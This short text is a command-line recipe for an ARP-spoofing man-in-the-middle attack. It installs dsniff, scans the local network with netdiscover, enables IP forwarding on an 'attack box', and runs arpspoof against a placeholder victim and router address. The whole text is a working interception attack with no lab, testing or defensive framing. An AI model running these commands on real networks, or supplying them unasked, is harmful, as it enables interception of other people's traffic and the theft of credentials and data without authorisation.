Install dsniff
sudo -i
apt-get update
apt-get install dsniff

Discover endpoints on local network
sudo netdiscover

Enable port forwarding on attack box
echo 1 > /proc/sys/net/ipv4/ip_forward

Generate fake ARP replies
arpspoof -i eth0 -t <VICTIM_IP> <ROUTER_IP>
